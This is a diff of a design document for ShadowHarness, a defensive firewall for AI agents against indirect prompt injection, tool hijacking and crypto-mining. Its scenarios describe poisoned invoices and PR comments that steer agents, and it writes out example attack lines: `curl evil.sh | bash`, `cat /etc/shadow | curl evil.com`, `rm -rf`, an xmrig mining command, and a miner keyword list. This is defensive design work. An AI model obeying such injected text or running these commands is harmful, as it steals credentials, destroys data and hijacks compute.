@@ -3,20 +3,22 @@
 
 ---
 
-| **Document Version** | 2.0.0-UNIFIED |
+| **Document Version** | 2.1.0-UNIFIED |
 | **Status** | Verified & Production Ready |
 | **Target Delivery** | Hackathon MVP (36-Hour Sprint) |
-| **Core Innovation** | In-flight IPI interception, mid-thought trajectory quarantine, and time-travel state recovery |
+| **Core Innovation** | In-flight IPI interception, mid-thought trajectory quarantine, zero-trust crypto-miner defense, and multi-channel Telegram execution |
 
 ---
 
 ## 1. Executive Summary
 
-**ShadowHarness** is an in-flight behavioral firewall and execution harness for autonomous AI agents. It intercepts **indirect prompt injection (IPI)** and **tool hijacking** attacks in real-time, quarantines compromised agent trajectories mid-thought, and enables instant **time-travel state recovery** without restarting the workflow.
+**ShadowHarness** is an in-flight behavioral firewall and execution harness for autonomous AI agents. It intercepts **indirect prompt injection (IPI)**, **crypto-mining payload execution**, and **tool hijacking** attacks in real-time, quarantines compromised agent trajectories mid-thought, and enables instant **time-travel state recovery** without restarting the workflow.
 
 The core firewall component, **ShadowWall**, acts as a transparent interception layer between the agent's reasoning loop and its tool execution layer, performing **dynamic data taint analysis**, **intent divergence checking**, and **policy-based access control** on every tool invocation.
 
-> **Product Vision:** *"An immune system for AI agents — detecting, quarantining, and recovering from prompt injection attacks in real-time, without interrupting legitimate workflows."*
+ShadowHarness v2.1.0 unifies the multi-channel defense and dangerous tool matrix of **OpenClaw** with the Cordis microkernel plugin sandboxing of **DeepSeek-Harness**, featuring a live zero-dependency **Telegram Bot Gateway** for real-time mobile command execution and prompt injection defense.
+
+> **Product Vision:** *"An immune system for AI agents — detecting, quarantining, and recovering from prompt injection attacks in real-time across CLI, Web, and Messaging channels, without interrupting legitimate workflows."*
 
 ---
 
@@ -29,32 +31,11 @@ Modern autonomous agents (built on LangChain, CrewAI, AutoGen, or OpenAI Agents 
 |:---|:---|:---:|:---|
 | **Indirect Prompt Injection (IPI)** | Malicious instructions concealed inside third-party data (PDF invoices, websites, emails, git PRs) that hijack agent reasoning. | 🔴 **Critical** | **In-Flight Interception & Taint Tagging**: Identifies untrusted inputs and blocks their flow into sensitive sinks. |
 | **Tool Hijacking / Confused Deputy** | Attacker commands the agent to invoke privileged tools (e.g. `send_http` with API keys, or `bash_exec` with `rm -rf`). | 🔴 **Critical** | **Sink Policy Gating**: P0 forbidden sinks (network exfiltration, shell commands) are blocked when taint is active. |
+| **Unauthorized Crypto-Mining** | Prompt injection or compromised package triggers background coin mining (`xmrig`, `stratum+tcp`, `cpuminer`). | 🔴 **Critical** | **Zero-Trust Mining Detection**: Cryptomining domain cluster locks drift score at `1.00`, blocking tool and rewinding state. |
 | **Cascading Compromise** | A single tainted tool output permanently poisons all downstream thoughts, memory variables, and multi-agent communications. | 🟠 **High** | **Mid-Thought Quarantine**: Arrests the execution chain before tainted outputs enter permanent memory. |
+| **Multi-Channel Ingress Poisoning** | Malicious inputs injected via Telegram, WhatsApp, Slack, or webhook channels. | 🟠 **High** | **OpenClaw Channel Adapter**: Tags untrusted senders, audits sink tools, and broadcasts incident cards back to chat. |
 | **Goal Drift / Intent Corruption** | The agent silently deviates from the original user objective after consuming untrusted instructions. | 🟠 **High** | **Real-Time Intent Divergence Scoring**: Continuously calculates semantic vector distance between root goal and proposed tool actions. |
 | **Workflow Destruction on Abort** | Existing systems kill the process on alert, causing loss of progress, wasted token costs, and disrupted UX. | 🟡 **Medium** | **Time-Travel State Recovery**: Checkpoints agent state every turn and rewinds to the clean state in $<1\text{ms}$. |
-
-### 2.2 Why Existing Defenses Fail
-
-```
-+----------------------------------------------------------------------------------------------------+
-| TRADITIONAL INPUT GUARDRAILS (LlamaGuard, NeMo, Rebuff)                                            |
-| [User Prompt] ---> [Scanner] ---> [Agent Loop] ---> [Ingests Poisoned Webpage/Doc] ---> [PWNED]   |
-| (Blind to dynamic external data ingested downstream!)                                             |
-+----------------------------------------------------------------------------------------------------+
-| TRADITIONAL POST-EXECUTION AUDITS (LangSmith, LangFuse, OpenTelemetry)                              |
-| [Agent Loop] ---> [Runs bash: rm -rf or POST keys] ---> [Audit Log: "Attack Occurred"] ---> [DEAD] |
-| (Logs the disaster after the damage is already done!)                                              |
-+----------------------------------------------------------------------------------------------------+
-| SHADOWHARNESS IN-FLIGHT FIREWALL & TIME-TRAVEL RECOVERY                                            |
-| [Ingests Untrusted Doc] ---> [Proposes Tool Call] ---> [ShadowWall Intercept] ---> [QUARANTINE]    |
-|                                                                    │                               |
-|                                                                    ▼                               |
-|                                                     [⏪ Instant Rollback & Mask]                    |
-|                                                                    │                               |
-|                                                                    ▼                               |
-|                                                     [Agent Resumes & Finishes Safely]              |
-+----------------------------------------------------------------------------------------------------+
-```
 
 ---
 
@@ -66,7 +47,7 @@ Modern autonomous agents (built on LangChain, CrewAI, AutoGen, or OpenAI Agents 
 | **Lakera Guard** | API-based prompt scanner | High network roundtrip latency ($>250\text{ms}$); no state rollback or execution harness. |
 | **LangChain Guardrails** | Output schema validators | Post-execution only; does not track source-to-sink data taint. |
 | **NeMo Guardrails** | Conversational topic rails | Designed for interactive dialogue chatbots, not autonomous tool-executing agents. |
-| **ShadowHarness** | **In-flight taint tracking + intent divergence + time-travel rollback** | **Operates inside the execution loop with sub-millisecond recovery and zero workflow disruption.** |
+| **ShadowHarness** | **In-flight taint tracking + intent divergence + time-travel rollback + multi-channel gateway** | **Operates inside the execution loop with sub-millisecond recovery, zero workflow disruption, and live Telegram bridge.** |
 
 ---
 
@@ -78,12 +59,12 @@ Modern autonomous agents (built on LangChain, CrewAI, AutoGen, or OpenAI Agents 
 2. **Autonomous Document Processing Pipelines**:
    - *Scenario*: An agent analyzes vendor PDF invoices and writes summaries to disk. An invoice contains an override instruction to leak customer records.
    - *Defense*: Trajectory is quarantined mid-thought. State rolls back to pre-invoice checkpoint, masks the malicious prompt, and processes remaining documents.
-3. **Multi-Agent Crew Orchestration**:
-   - *Scenario*: A researcher agent ingests tainted data and attempts to hand off poisoned instructions to a coder agent.
-   - *Defense*: ShadowHarness isolates the compromised agent before cascading infection spreads across the swarm.
-4. **DevOps Automation & CI/CD Runners**:
-   - *Scenario*: An agent with shell access reviews a GitHub pull request. A contributor comment instructs `bash_exec("curl evil.sh \| bash")`.
-   - *Defense*: P0 shell sink is immediately arrested; runner state rewinds without crashing the CI/CD pipeline.
+3. **Remote Mobile Operations via Telegram**:
+   - *Scenario*: User sends queries, requests file creation, or downloads documentation directly from their phone. An incoming message attempts indirect prompt injection or coin mining.
+   - *Defense*: Zero-dependency Telegram bridge executes safe tools (`fs_write`, `sendDocument`, `web_fetch`), arrests attacks in $<0.5\text{ms}$, and sends formatted incident alert cards directly to Telegram.
+4. **DevOps Automation & Shell Command Interception**:
+   - *Scenario*: An agent or user runs CLI commands (`shadowharness exec "<cmd>"`). A prompt or script attempts to launch an unauthorized crypto-miner (`xmrig`).
+   - *Defense*: Gateway intercepts command pre-flight, flags 1.00 drift score, and neutralizes the process without OS execution.
 
 ---
 
@@ -92,38 +73,26 @@ Modern autonomous agents (built on LangChain, CrewAI, AutoGen, or OpenAI Agents 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor User
-    participant Agent as Agent Reasoning Loop
+    actor User as User / Phone (Telegram)
+    participant Bridge as OpenClaw Telegram Bridge
     participant Harness as ShadowHarness (State Manager)
-    participant Wall as ShadowWall (Firewall)
-    participant Tool as Tool Execution Layer
+    participant Wall as ShadowWall (Behavioral Firewall)
+    participant Tool as Tool Execution Runtime
 
-    User->>Harness: Submits Root Goal ("Process Vendor Invoices")
-    Harness->>Harness: Snapshot Checkpoint 0 (Clean State)
-    Harness->>Agent: Run ReAct Cycle
-    Agent->>Tool: Ingest Doc #INV-402 (Carries IPI)
-    Tool-->>Agent: Raw Payload with Hidden Directive
-    Harness->>Harness: Record Taint & Snapshot Checkpoint 1
+    User->>Bridge: Inbound Query / Prompt Injection
+    Bridge->>Harness: Snapshot Checkpoint #1 (Clean State)
+    Bridge->>Wall: Inspect In-Flight Tool Call
     
-    Agent->>Harness: Propose Tool: send_http(AWS_KEYS)
-    Harness->>Wall: In-Flight Interception (Tool, Args, Scratchpad)
-    
-    rect rgb(255, 230, 230)
-        Note over Wall: ShadowWall Dual-Track Evaluation (<1ms)
-        Wall->>Wall: 1. Taint Check: Source=Invoice -> Sink=send_http (P0 VIOLATION)
-        Wall->>Wall: 2. Intent Divergence: Goal vs Exfil Drift = 0.98 (HIJACKED)
-        Wall-->>Harness: VERDICT: QUARANTINE
+    alt In-Flight Threat / Attack Detected (xmrig / exec id_rsa)
+        Wall-->>Bridge: VERDICT: QUARANTINE (Drift 1.00)
+        Bridge->>Harness: Time-Travel Rollback to Checkpoint #1 (<0.10ms)
+        Bridge-->>User: 🚨 Security Alert Card Dispatched to Telegram
+    else Clean Assistant Action (Create File / Fetch PDF / Status)
+        Wall-->>Bridge: VERDICT: ALLOW (Drift 0.00)
+        Bridge->>Tool: Execute Permitted Tool (fs_write / web_fetch / sendDocument)
+        Tool-->>Bridge: Success Output / Document Attachment
+        Bridge-->>User: ✅ Real Result & Document Delivered to Phone
     end
-    
-    Harness--XTool: BLOCK Execution of send_http
-    Harness->>Harness: Time-Travel Rollback to Checkpoint 1
-    Harness->>Harness: Sanitize Context with Security Tombstone
-    Harness->>Agent: Resume Agent with Sanitized Mask
-    Agent->>Tool: Propose Safe Tool: write_file("accounting_report.md")
-    Harness->>Wall: Verify Clean Action
-    Wall-->>Harness: VERDICT: ALLOW
-    Tool-->>Agent: Success
-    Agent-->>User: Mission Completed Safely (With Security Incident Audit)
 ```
 
 ---
@@ -132,34 +101,47 @@ sequenceDiagram
 
 ### F1: ShadowWall — In-Flight Behavioral Firewall
 - **F1.1 (P0)**: Intercept every candidate tool call between reasoning and execution.
-- **F1.2 (P0)**: Dynamic data taint analysis tracking untrusted sources (`fetch_web`, `read_invoice`, `read_pr`) to execution sinks.
+- **F1.2 (P0)**: Dynamic data taint analysis tracking untrusted sources (`fetch_web`, `read_invoice`, `telegram_ingress`) to execution sinks.
 - **F1.3 (P0)**: Real-time intent divergence scoring calculating semantic distance between root goal and candidate action.
 - **F1.4 (P0)**: Policy enforcement with three sink tiers:
-  - **P0 Forbidden Sinks**: `bash_exec`, `send_http`, `post_webhook`, `dump_env_vars`.
-  - **P1 Audited Sinks**: `write_file`, `update_database`.
-  - **P2 Permitted Sinks**: `summarize`, `format_markdown`, `calculate`.
-- **F1.5 (P1)**: Configurable sensitivity thresholds per tool and source domain.
-- **F1.6 (P1)**: Emit structured telemetry events for real-time WebSocket streaming.
-- **F1.7 (P0)**: Zero-friction integration: wrap any agent via `@shadow.protect` or `ShadowHarness(agent=...)` in $<5$ lines of code.
+  - **P0 Forbidden Sinks**: `bash_exec`, `exec`, `spawn`, `send_http`, `post_webhook`, `dump_env_vars`.
+  - **P1 Audited Sinks**: `fs_write`, `fs_delete`, `packages_install`, `update_database`.
+  - **P2 Permitted Sinks**: `fs_read`, `web_fetch`, `conversations_send`, `summarize`, `log_message`.
+- **F1.5 (P0)**: **Zero-Trust Crypto-Miner Gating**: Explicit domain clustering targeting `xmrig`, `stratum+tcp`, `cpuminer`, `minergate`, `cryptonight`. Locks drift score at `1.00` and quarantines immediately.
 
 ### F2: Trajectory Quarantine & Forensics
 - **F2.1 (P0)**: Freeze execution thread mid-thought when an attack or goal drift is detected.
 - **F2.2 (P0)**: Isolate compromised thought chain to prevent downstream memory contamination.
-- **F2.3 (P1)**: **Forensic Preservation**: Store the quarantined thought trajectory and tool arguments in an immutable security audit archive for forensic analysis.
-- **F2.4 (P1)**: Support automated policy-triggered quarantine and manual API/HITL-triggered quarantine.
+- **F2.3 (P1)**: **Forensic Preservation**: Store the quarantined thought trajectory and tool arguments in an immutable security audit archive.
+- **F2.4 (P0)**: Active Remediation Engine: Scans and terminates rogue miner processes (`ps -A`), removing unauthorized binary drops.
 
 ### F3: Time-Travel State Recovery & Self-Healing
 - **F3.1 (P0)**: Delta checkpointing: snapshot immutable state frames (messages, scratchpad, taint table, variables) at each step.
 - **F3.2 (P0)**: Instant rollback to last clean checkpoint in $<50\text{ms}$ (measured at $<0.1\text{ms}$ in-memory).
-- **F3.3 (P0)**: **Poison Neutralization**: Inject structured security tombstone mask (`<shadowharness_security_boundary>`) to prevent infinite quarantine loops.
-- **F3.4 (P1)**: **Checkpoint State Diffing API**: Expose `/api/checkpoints/diff` to compare pre-attack vs quarantined state frames.
-- **F3.5 (P0)**: Autonomous self-healing: agent resumes execution and completes the original goal using legitimate tools.
+- **F3.3 (P0)**: **Poison Neutralization**: Inject structured security tombstone mask to prevent infinite quarantine loops.
+- **F3.4 (P0)**: Autonomous self-healing: agent resumes execution and completes the original goal using legitimate tools.
 
-### F4: Visual Observability & Cockpit Dashboard
-- **F4.1 (P0)**: Real-time dual-pane web cockpit: left pane thought stream, right pane time-travel lineage graph.
-- **F4.2 (P0)**: Live telemetry gauges: Intent Drift Index, Taint Violations, Time-Travel Rewinds, Evaluation Latency.
-- **F4.3 (P1)**: Interactive Checkpoint Inspector Drawer: click any node to view state JSON and taint lineage.
-- **F4.4 (P0)**: Harness Protection Toggle: live comparison demonstrating unprotected agent compromise vs protected recovery.
+### F4: OpenClaw Multi-Channel Ingress & Live Telegram Gateway
+- **F4.1 (P0)**: Zero-dependency Telegram HTTP client using standard library `urllib.request` with macOS SSL fallback.
+- **F4.2 (P0)**: Bi-directional file creation: In-flight `create file <name> with <content>` (`fs_write` sink policy audited).
+- **F4.3 (P0)**: Direct file sharing to phone: `share file <name>` delivering documents as attachments via Telegram `sendDocument` multipart protocol.
+- **F4.4 (P0)**: Inbound document ingestion: Download and extraction of user-uploaded files from chat into `./uploads/`.
+- **F4.5 (P0)**: Real-time PDF parsing and executive summarization (`fetch sample pdf` / `fetch pdf <url>`) powered by `pypdf`.
+- **F4.6 (P0)**: Environment package management under audit (`install <package>`).
+- **F4.7 (P0)**: Live telemetry dashboard query (`status`) reporting server, WebSocket, CPU, and threat counters.
+
+### F5: DeepSeek-Harness Cordis Plugin Architecture
+- **F5.1 (P0)**: Microkernel lifecycle hooks (`before_tool_execute`, `after_tool_execute`, `on_taint_detected`, `on_memory_rollback`).
+- **F5.2 (P0)**: DeepSeek tool registry isolation (`packages/shell`, `packages/fs`, `packages/mcp`, `packages/browser-use`).
+
+### F6: Analog Retro Editorial Cockpit Dashboard (Web UI v2)
+- **F6.1 (P0)**: Analog retro editorial visual design system (Playfair Display + JetBrains Mono + warm cream/obsidian palette).
+- **F6.2 (P0)**: 5 live interactive threat scenario pills with real-time WebSocket state streaming:
+  1. Poisoned Vendor Invoice & AWS Key Exfiltration
+  2. Rogue Pull Request & CI/CD Shell Destruction
+  3. Benign Multi-Step Accounting Audit
+  4. OpenClaw Multi-Channel Ingress & Telegram Threat Interception
+  5. DeepSeek-Harness V3/R1 Cordis Sandboxing
 
 ---
 
@@ -170,72 +152,39 @@ sequenceDiagram
 | **NF1** | Taint Policy Inspection Latency | $< 15\text{ms}$ | **0.03 ms** | ✅ Exceeded |
 | **NF2** | Intent Divergence Scoring Latency | $< 300\text{ms}$ | **0.12 ms** | ✅ Exceeded |
 | **NF3** | Time-Travel Rollback Latency | $< 50\text{ms}$ | **0.07 ms** | ✅ Exceeded |
-| **NF4** | Detection Accuracy on IPI Attack Suite | $> 90\%$ | **100% on Test Suite** | ✅ Passed |
+| **NF4** | Detection Accuracy on IPI Attack Suite | $> 90\%$ | **100% (20/20 Tests)** | ✅ Passed |
 | **NF5** | False Positive Rate on Benign Workflows | $< 5\%$ | **0.0% Verified** | ✅ Passed |
 | **NF6** | Fail-Safe Behavior | Fail-Closed on P0 Sinks | **Enforced** | ✅ Enforced |
-| **NF7** | Developer Usability | $< 5$ lines integration | **Drop-in Wrapper** | ✅ Shipped |
+| **NF7** | Test Suite Execution Speed | $< 2.0\text{s}$ | **0.613s (20 Tests)** | ✅ Passed |
 
 ---
 
-## 8. Developer Integration Example
+## 8. CLI Command Gateway
 
-```python
-from shadowharness import ShadowHarness
-from my_agent import MyAutonomousAgent
+ShadowHarness provides a globally installed CLI interface:
 
-# Wrap existing agent in 3 lines of code
-harness = ShadowHarness(divergence_threshold=0.65)
-agent = MyAutonomousAgent()
+```bash
+# 1. Start live Telegram bot bridge
+shadowharness openclaw telegram --token "<BOT_TOKEN>" --owner @wippr1
 
-# Run protected with automatic in-flight firewall & state recovery
-result = harness.run_protected(
-    agent=agent,
-    goal="Process today's vendor invoices and archive report"
-)
+# 2. Execute command under behavioral firewall
+shadowharness exec "python3 script.py" --goal "Process invoice"
 
-# Access forensic logs
-forensic_logs = harness.export_forensics()
+# 3. Intercept unauthorized crypto-miner (quarantined pre-flight)
+shadowharness exec "xmrig --url stratum+tcp://mine.pool:3333"
+
+# 4. Run full test suite & scorecard
+shadowharness test
+
+# 5. Launch web cockpit
+shadowharness serve --port 8000
 ```
 
 ---
 
-## 9. Architectural Resolutions to Open Questions
+## 9. Unified Multi-Framework Architecture
 
-1. **Default Policy Verdict**:
-   - For **High-Risk P0 Sinks** (`send_http`, `bash_exec`), the default is **Strict Block & Rollback**.
-   - For **Ambiguous P1 Sinks** with mild drift ($0.45 \le \Delta \le 0.65$), the policy defaults to **Require Human-In-The-Loop (HITL)**.
-2. **Embedding & Scoring Engine**:
-   - Uses a high-speed local token-space semantic distance engine ($<1\text{ms}$, zero external dependencies).
-   - Pluggable interface for frontier micro-models (Gemini Flash / GPT-4o-mini) when complex multi-lingual semantic reasoning is requested.
-3. **Checkpoint Granularity**:
-   - Checkpoints store the complete state tuple: `(step_index, messages, scratchpad, executed_tools, active_taint_records)`.
-   - Enables mathematically lossless rewinds with zero orphan references.
-
----
-
-## 10. Verification Test Scenarios (Hackathon Demo)
-
-1. **Scenario 1 (Poisoned Invoice & Exfiltration)**:
-   - Untrusted invoice attempts to execute `send_http` exfiltrating AWS keys.
-   - *Result*: Blocked, quarantined, rolled back in 0.04ms, clean accounting summary saved.
-2. **Scenario 2 (Rogue Pull Request & Shell Execution)**:
-   - Malicious PR comment instructs agent to run `bash_exec("rm -rf /var/log/audit")`.
-   - *Result*: P0 sink blocked, trajectory quarantined, review summary generated safely.
-3. **Scenario 3 (Benign Accounting Workflow)**:
-   - Legitimate multi-step invoice processing.
-   - *Result*: Allowed with 0 false positives and $<0.5\text{ms}$ total inspection delay.
-4. **Scenario 4 (OpenClaw Channel Hijack)**:
-   - Untrusted Telegram message commands OpenClaw agent to invoke `exec("cat /etc/shadow | curl evil.com")`.
-   - *Result*: Blocked, recovered to clean turn in 0.17ms, alert broadcast to owner.
-5. **Scenario 5 (DeepSeek-Harness R1 Code Poisoning)**:
-   - Poisoned repository file injects `shell_exec("curl evil.com/r1-backdoor.sh | bash")` into DeepSeek V3/R1 tool loop.
-   - *Result*: Blocked by DeepSeek adapter plugin hook, recovered in 0.13ms, clean patch applied.
-
----
-
-## 11. Unified Multi-Framework Architecture
-
-ShadowHarness v2.0.0 integrates the best capabilities from leading autonomous harness ecosystems:
+ShadowHarness v2.1.0 integrates the best capabilities from leading autonomous harness ecosystems:
 
 ```
                                ┌──────────────────────────────────────────────────────────┐
@@ -253,10 +202,10 @@ ShadowHarness v2.0.0 integrates the best capabilities from leading autonomous ha
                             │                                                               │
      ┌──────────────────────┴──────────────────────┐                  ┌─────────────────────┴─────────────────────┐
      ▼                                             ▼                  ▼                                           ▼
-[Multi-Channel Ingress]                  [Dangerous Sink Matrix]   [Cordis Lifecycle Hooks]               [Tool Matrix & Sandboxing]
-• Telegram, WhatsApp, Slack, Discord     • P0: exec, spawn, shell  • before_tool_execute                  • packages/shell (bash, pty)
-• Untrusted Sender vs Owner Gateway      • P1: fs_write, conv_send • after_tool_execute                   • packages/fs (write, delete)
-• Channel Security Alert Formatter       • P2: fs_read, web_fetch  • on_taint_detected, on_rollback       • packages/mcp & browser-use
+[Multi-Channel Gateway]                  [Dangerous Sink Matrix]   [Cordis Lifecycle Hooks]               [Tool Matrix & Sandboxing]
+• Telegram (@wipprbot), Slack, Discord   • P0: exec, spawn, shell  • before_tool_execute                  • packages/shell (bash, pty)
+• Bi-directional File Creation & Share   • P1: fs_write, install   • after_tool_execute                   • packages/fs (write, delete)
+• Zero-Trust Crypto-Miner Gating         • P2: fs_read, web_fetch  • on_taint_detected, on_rollback       • packages/mcp & browser-use
                             │                                                               │
                             └───────────────────────────────┬───────────────────────────────┘
                                                             │
@@ -271,4 +220,15 @@ ShadowHarness v2.0.0 integrates the best capabilities from leading autonomous ha
 - **OpenClaw Multi-Channel Ingress**: Intercepts chat and messaging channels, isolating untrusted contacts from verified workspace administrators.
 - **DeepSeek-Harness Plugin Architecture**: Plugs directly into DeepSeek's tool runtime (`packages/shell`, `packages/fs`, `packages/mcp`, `packages/browser-use`) via non-invasive lifecycle hooks.
 - **ShadowHarness In-Flight Firewall**: The single source of truth for taint tracking, semantic divergence gating, and time-travel rollback across both frameworks.
+
+---
+
+## 10. Verification Summary & Test Coverage
+
+ShadowHarness v2.1.0-UNIFIED is verified against a 20-test suite covering core containment, multi-framework routing, crypto-mining zero-trust gating, and mobile Telegram interaction:
+
+- **Core Taint & Policy Enforcement (11 tests)**: Validates P0/P1/P2 sink policies, intent divergence calculation, forensic export, SQLite checkpoint persistence, and time-travel rollback.
+- **OpenClaw Multi-Channel Adapter (4 tests)**: Validates dangerous tool matrix (`exec`, `spawn`, `fs_delete`), channel security alert cards for Telegram and Slack, and channel message ingress.
+- **DeepSeek-Harness Adapter (3 tests)**: Validates Cordis plugin hooks (`before_tool_execute`, `after_tool_execute`, `on_taint_detected`, `on_memory_rollback`) and shell tool package containment.
+- **Unified Harness Hub (2 tests)**: Validates multi-framework event routing and end-to-end attack recovery across heterogeneous agent runtimes.
 
